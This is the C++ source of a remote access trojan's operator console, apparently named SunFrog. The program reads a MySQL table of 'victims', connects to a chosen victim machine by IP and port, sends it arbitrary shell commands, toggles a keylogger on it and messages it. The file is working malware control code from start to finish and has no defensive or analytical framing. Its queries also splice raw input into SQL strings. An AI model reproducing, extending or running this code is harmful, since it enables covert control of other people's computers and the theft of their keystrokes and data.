// SunFrog.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Vector>
#include <thread>

#include "../WinNetlib/Single/Single_NetworkHandlerClient.h"
#include "../UsefulFuncts/UsefulFuncts.h"


#include<mysql.h>
#include "../DataBase/DataBase.h"

#include "../Shared.h"


using namespace std;

void recvLoop(Single_NetworkHandlerClient* Victim, string name) {
	while (Victim->IsConnected()) {
		string i;
		Victim->RecvDataT<string>(&i);
		if (i!="") {
			printf("\n");
			UFuncts::printfC("<%s>: %s\n", 3, 0, 0, 0, name.c_str(), i.c_str());
		}
	}
}

int main(int argc, char** argv)
{
	if (argc < 6) {
		UFuncts::printfC("missing arguments!", 4, 0, 1, 0);
		printf("\n");
		return -1;
	}

	Single_NetworkHandlerClient Victim;

	string vicName="";

	Victim.SetName("Master");

	thread recvThread;

	DataBase RatDB(argv[1], argv[2], argv[3], argv[4], atoi(argv[5]));

	if (RatDB.Init()) {
		UFuncts::printfC("Connected to DB!", 2, 0, 1, 0);
		printf("\n");
	}
	int cols = RatDB.GetNumColumns("victims");	

	bool run = true;
	string input;
	do
	{
		UFuncts::printfC("Currently %d Victims in database.", 4, 0, 1, 0, RatDB.GetNumRows("victims"));
		printf("\n");
		UFuncts::printfC("Currently Connected to %s", 4, 0, 1, 0, vicName.c_str());
		printf("\n");
		UFuncts::printfC("Enter Command: ", 1, 0, 1, 0, RatDB.GetNumRows("victims"));
		getline(cin, input);
		if (input=="exit"||input == "Exit") {
			run = false;
		}
		else if (input == "lsvic" || input == "LsVic") {
			system("cls");
			RatDB.Query("SELECT * FROM victims");
			while (RatDB.GetRow()) {
				for (int i = 0; i < cols; i++)
				{
					UFuncts::printfC("%s ", i + 2, 0, 1, 0, RatDB.row[i]);
				}
				cout << endl;
			}
		}
		else if (input == "connect" || input == "Connect") {
			UFuncts::printfC("Enter name: ", 5, 0, 0, 0);
			getline(cin, input);
			RatDB.Query("SELECT IP FROM victims where Name='" + input + "'");
			if (!RatDB.GetRow()) {
				vicName = "Invalid Name";
				continue;
			}
			vicName = input;
			cout << RatDB.row[0] << endl;

			PCSTR ip = RatDB.row[0];

			RatDB.Query("SELECT Port FROM victims where Name='" + input + "'");
			RatDB.GetRow();
			cout << RatDB.row[0] << endl;

			PCSTR port = RatDB.row[0];

			Victim.Init(ip, port);
			Victim.Connect();
			recvThread = thread(recvLoop, &Victim, vicName);
		}
		else if (input == "disconnect" || input == "Disconnect") {
			Victim.SendDataT<Packets>(Packets::P_Disconnect);
			Victim.DisConnect();
			recvThread.join();
		}
		else if (input == "messagevictim" || input == "MessageVictim") {
			bool loop = true;
			while (loop) {
				UFuncts::printfC("Enter Message (type \"esc\" to return): ", 5, 0, 0, 0);
				getline(cin, input);
				if (input == "esc") {
					loop = false;
					continue;
				}
				Victim.SendDataT<Packets>(Packets::P_MSG);
				Victim.SendDataT<string>(input);
				Sleep(2000);
			};
		}
		else if (input == "help" || input == "Help") {
			UFuncts::printfC("ToggleKeylogger, SendSysCmd, MessageVictim, Disconnect, Connect, ListVic, Exit, Help", 6, 0, 0, 0);
			printf("\n");
		}
		else if (input == "sendsyscmd" || input == "SendSysCmd") {
			UFuncts::printfC("Enter Command: ", 5, 0, 0, 0);
			getline(cin, input);
			Victim.SendDataT<Packets>(P_CMD);
			Victim.SendDataT<string>(input);
			UFuncts::printfC("Returned:", 6, 0, 0, 0);
			printf("\n");
			Sleep(1000);
		}
		else if (input == "togglekeylogger" || input == "ToggleKeylogger") {
			Victim.SendDataT<Packets>(Packets::P_KEYLOG);
		}
	} while (run);

	//recvThread.join();
	Victim.DisConnect();
    return 0;
}

